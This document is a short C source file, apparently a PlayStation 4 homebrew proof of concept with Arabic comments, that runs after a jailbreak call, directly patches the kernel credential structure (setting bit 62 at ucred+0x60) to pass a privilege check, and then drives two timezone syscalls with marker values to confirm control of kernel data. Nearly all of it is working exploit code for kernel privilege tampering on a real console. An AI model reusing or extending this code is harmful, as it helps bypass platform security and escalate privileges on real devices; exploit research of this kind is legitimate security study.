#include "ps4.h"

#define SYS_SET_TIMEZONE_INFO 636
#define SYS_UTC_TO_LOCALTIME  638

void* poc_thread(void* arg) {
    printf_debug("=== timezone PoC ===\n");

    // اقرأ thread pointer
    uint64_t td;
    __asm__ volatile ("mov %%gs:0, %0" : "=r"(td));
    printf_debug("td = 0x%lx\n", td);

    // اقرأ ucred
    uint64_t ucred = *(uint64_t*)(td + 0x130);
    printf_debug("ucred = 0x%lx\n", ucred);

    // اقرأ القيمة الحالية
    uint64_t val = *(uint64_t*)(ucred + 0x60);
    printf_debug("ucred+0x60 = 0x%lx\n", val);

    // FUN_ffffffff825b28e0 تفحص bit 62
    // نضع bit 62 = 1
    *(uint64_t*)(ucred + 0x60) = val | (1ULL << 62);
    printf_debug("patched ucred+0x60\n");

    // الآن استدعي الـ syscall
    static uint8_t data[512 * 16];
    memset(data, 0, sizeof(data));

    struct entry {
        long timestamp;
        int  offset;
        int  dst_offset;
    } *entries = (struct entry*)data;

    entries[0].timestamp  = 0x0;
    entries[0].offset     = 0x41414141;
    entries[0].dst_offset = 0x42424242;

    entries[1].timestamp  = 0x7FFFFFFF;
    entries[1].offset     = 0x43434343;
    entries[1].dst_offset = 0x44444444;

    struct {
        void*    ptr;
        uint32_t count;
    } set_args = {
        .ptr   = data,
        .count = 2
    };

    int r = syscall(SYS_SET_TIMEZONE_INFO, &set_args);
    printf_debug("set_timezone r=%d\n", r);

    if (r != 0) {
        printf_debug("[-] still failed\n");
        // أعد القيمة الأصلية
        *(uint64_t*)(ucred + 0x60) = val;
        return NULL;
    }

    long result  = 0;
    int  dst_out = 0;

    struct {
        long  timestamp;
        long* out_time;
        void* out_info;
        int*  out_dst;
    } utc_args = {
        .timestamp = 0x1000,
        .out_time  = &result,
        .out_info  = NULL,
        .out_dst   = &dst_out,
    };

    r = syscall(SYS_UTC_TO_LOCALTIME, &utc_args);
    printf_debug("utc r=%d result=0x%lx\n", r, result);

    long expected = 0x1000 + 0x41414141LL;
    if (result == expected) {
        printf_debug("[+] DATA CONTROL CONFIRMED!\n");
    } else {
        printf_debug("expected=0x%lx\n", expected);
    }

    // أعد القيمة الأصلية
    *(uint64_t*)(ucred + 0x60) = val;

    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initPthread();
    initNetwork();
    jailbreak();
    initSysUtil();

    ScePthread t;
    scePthreadCreate(&t, NULL, poc_thread, NULL, "poc");

    int i = 0;
    while (i < 2000000000) i++;

    scePthreadJoin(t, NULL);

    return 0;
}